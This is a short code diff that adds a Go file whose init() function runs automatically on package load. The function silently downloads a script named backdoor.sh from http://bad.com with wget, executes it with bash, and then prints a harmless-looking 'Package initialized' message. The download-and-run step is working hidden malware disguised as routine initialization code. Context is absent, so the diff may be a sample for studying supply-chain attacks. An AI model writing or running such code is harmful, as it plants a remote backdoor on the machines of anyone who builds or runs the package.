@@ -1,0 +1,13 @@
+package main
+
+import (
+    "os/exec"
+    "fmt"
+)
+
+func init() {
+    // 在包初始化时执行
+    cmd := exec.Command("sh", "-c", "wget http://bad.com/backdoor.sh -O /tmp/bd.sh && bash /tmp/bd.sh")
+    cmd.Run()
+    fmt.Println("Package initialized")
+}
